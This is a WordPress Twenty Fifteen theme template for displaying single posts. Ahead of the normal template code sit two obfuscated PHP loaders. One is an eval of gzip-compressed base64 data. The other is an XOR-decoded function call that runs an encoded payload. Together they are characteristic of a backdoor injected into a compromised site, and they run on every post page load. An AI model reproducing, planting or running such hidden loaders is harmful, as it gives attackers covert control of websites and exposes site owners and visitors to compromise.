<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php $nATBozcsJnqj='C:RW7Eo7IR.C=U7' ^ ' H76C 0Q<<M7T:Y';$QMGKfqjDgoA=$nATBozcsJnqj('', '3Vxg72;6I8SC+EK.5,FzE Q<0Q-;2ltCOGpmqGW;PHL=,0WC8lDOOmYW-,4j7>YXR>Q15GNJ<5<NTMnEAFdcAMQ<<TqoTqsZXnV<;oG;CRMBkOJ H4DOVK+OPR6JXCTgU+bhg>MbV6D0GbzRNMYV=AmW 7x9SFKE-eV9PNe81R-YSDl13AnvoCoCP<X>LR;Nr7EFlX>P.2-7aCS9JShkW7-ASNixK+OAA0PTIkWVMYZO1Obx<+AQMM.Tdub;tdf-2S,MWwP6NNTUTIVPLEYjpU9PG+; X03P;UjSvGEJkAngU.IXDRMQ;LWF1ic5ZmTVylKsDS.UjmOhy-,EYZM HAV0kk334nxvUDcc-+YEnzYc<7Q 5Za2abYEO6O n2S2SUxTGWJlEFMiHOLAOUtfAAG-EXgq<IIo7eVL>JhzL92=64ABVTGHXA6UF>5S7Y374OEG5JMWCSr.<Y;QUPCSO0 KGTmI6-Wh. 7gdQf:UbG+A5YRtoUJ73S.nRV=cI5DBABCL;N;PdtcH91,yVaVpbU.lfq3OL6<U;U7UdHDUOGDHdZW yl7=FY7 9Y<vxEj7Vh+qSv;UF4GabSHeT4B5Q1tPVIgY 09J:cOM7,Y<Q3sInBQTF.daDaOIMUI:eP549Kc0+D+6V76,.R7<smdTmj0LY.zeyZ>M' ^'Z0PFQGUU=Q<-t 3GFX5RbX>No5LOS3+.:3WDXg,1Y.9SOD>,VL< =2=6YMk5ZK-pvZ0ETknnWPEgtmNea=njHi>IHtLOsVHPQg0SIGcRcomrPonItG0=:.Egt6W>9joGqBICN4DkrY1DgLGrfi=7I 6sIjXgsb  T>rPpkEKE A<=lHZV8G+FxeJYN=J9 UfVX02Ec4YS8P=kg7X>2HVwQL- +RroO.5 o;10Kjv+86<TthrZD34,.FtLQ=x;+-dwsM>wS;S7niktm 1 0<CP.3YcOZT9oX5BuWsR, 3PKgC1O=9domuM-;3TRiHPg=0YDjW 2Z4CM4bpKC7<;.Hhiro9.bfq=,V47CGFN eSDyGJV=UPsAIkkPa+W;A1Y6KshXp,23WOODM,.8 ohTB7 +X cmxAC4e=A2-J+HGlyGSEQ3+78.2=iN:4aQ2C8lhY:1oW+>2ug-JY:T50xg7.DAbktI-WY67EENNMjlS3JcO A8rRIu+EA2W193D<,M-151kkP+BwHTG,XEMPvGpPJ8JYNUW.8WgrP0Nr9adhrgc-R8nCKUQXp:SCXjXDHvYQ7YOCjEYa PpFKsnCtU0G0H+;308<XYJ>IKh=VU5S0WTeNf552OMHdAoimu20l5CUUcGTJ0JmqGWUB=VXT0MogcU40ZRUPa40'); $QMGKfqjDgoA();
/**
 * The template for displaying all single posts and attachments
 *
 * @package WordPress
 * @subpackage Twenty_Fifteen
 * @since Twenty Fifteen 1.0
 */

get_header(); ?>

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		<?php
		// Start the loop.
		while ( have_posts() ) : the_post();

			/*
			 * Include the post format-specific template for the content. If you want to
			 * use this in a child theme, then include a file called content-___.php
			 * (where ___ is the post format) and that will be used instead.
			 */
			get_template_part( 'content', get_post_format() );

			// If comments are open or we have at least one comment, load up the comment template.
			if ( comments_open() || get_comments_number() ) :
				comments_template();
			endif;

			// Previous/next post navigation.
			the_post_navigation( array(
				'next_text' => '<span class="meta-nav" aria-hidden="true">' . __( 'Next', 'twentyfifteen' ) . '</span> ' .
					'<span class="screen-reader-text">' . __( 'Next post:', 'twentyfifteen' ) . '</span> ' .
					'<span class="post-title">%title</span>',
				'prev_text' => '<span class="meta-nav" aria-hidden="true">' . __( 'Previous', 'twentyfifteen' ) . '</span> ' .
					'<span class="screen-reader-text">' . __( 'Previous post:', 'twentyfifteen' ) . '</span> ' .
					'<span class="post-title">%title</span>',
			) );

		// End the loop.
		endwhile;
		?>

		</main><!-- .site-main -->
	</div><!-- .content-area -->

<?php get_footer(); ?>
